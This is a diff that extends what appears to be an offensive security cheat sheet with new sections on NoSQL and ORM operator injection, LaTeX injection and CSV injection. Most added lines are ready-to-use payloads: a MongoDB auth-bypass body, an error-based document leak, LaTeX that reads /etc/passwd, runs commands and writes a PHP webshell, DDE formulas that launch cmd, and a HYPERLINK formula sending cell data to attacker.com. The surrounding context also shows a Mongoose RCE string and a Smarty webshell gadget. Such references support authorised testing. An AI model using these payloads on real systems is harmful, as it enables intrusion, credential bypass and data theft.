@@ -75,8 +75,15 @@
 
 ### Exotic NoSQL Sinks
 - **Mongoose RCE (CVE-2024-53900 / CVE-2025-23061):** `populate().match` copied objects before MongoDB validation: `author[$where]=global.process.mainModule.require('child_process').execSync('id')`
+- **Mongoose error-based extraction:** `{"$where":"throw new Error(JSON.stringify(this))"}` — leaks the entire document via error message
 - **Rocket.Chat CVE-2023-28359:** unpatched Meteor method accepted `$where` operators on `listEmojiCustom`
 - **Cross-collection data access** via `$lookup` aggregation pipelines with regex on sensitive fields
+
+### ORM / REST API Operator Injection
+- REST APIs that pass query params directly to ORM filter methods: `?filter[password][$ne]=x`, `?username[$exists]=true`
+- Very common in Node.js (Mongoose, Sequelize) and PHP (Laravel Eloquent with array filters) when `req.query` is spread directly into a find/where call
+- MongoDB operator injection: `{"username": {"$gt": ""}, "password": {"$gt": ""}}` in JSON body — auth bypass without knowing credentials
+- Sequelize operator injection via aliased operators: `{[Op.gt]: 0}` constructed from user input when `operatorsAliases` enabled (deprecated but present in legacy apps)
 
 ---
 
@@ -176,6 +183,33 @@ Inject `{{7*7}}`, `${7*7}`, `<%= 7*7 %>`, `#{7*7}`, `{7*7}`, `${{7*7}}` — resp
 **Smarty — writeFile gadget:** `{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,"<?php passthru($_GET['cmd']); ?>",self::clearConfig())}`
 
 **Elixir EEx — System.shell:** `<%= elem(System.shell("id"), 0) %>`
+
+---
+
+## LaTeX Injection
+
+- **File read:** `\input{/etc/passwd}`, `\include{/etc/passwd}`
+- **Command execution:** `\immediate\write18{id > /tmp/o}` — requires `--shell-escape` flag; common in online compilers (Overleaf, academic platforms)
+- **Catcode bypass:** `\catcode\`\@=11` then `\@input{/etc/passwd}` — redefines `@` as a letter to access internal macros
+- **File write to webshell:**
+  ```
+  \newwrite\f
+  \openout\f=/tmp/x.php
+  \write\f{<?php system($_GET["c"])?>}
+  \closeout\f
+  ```
+- **Targets:** academic platforms (homework/thesis submission), invoice generators, report builders, CV generators, any app that renders user-supplied LaTeX to PDF
+
+---
+
+## CSV Injection
+
+- **DDE formula injection:** `=cmd|'/C calc'!A0`, `=MSEXCEL|'\..\..\..\Windows\System32\cmd.exe /c calc'!A1`
+- **Data exfiltration:** `=HYPERLINK("http://attacker.com/?d="&A1,"Click")` — leaks adjacent cell content when victim clicks
+- **Trigger prefixes:** `=`, `+`, `-`, `@`, `|` — also `%0A` / `%0D` (newline injection to escape cells and inject new rows)
+- **Impact:** arbitrary command execution on the victim's machine when they open an exported CSV in Excel/LibreOffice; data exfiltration via hyperlink callback
+- **Targets:** any feature that exports user-controlled data to CSV (reports, audit logs, order exports, user lists)
+- **Mitigation check:** look for prefix stripping of `= + - @ |` before writing to CSV cells
 
 ---
 
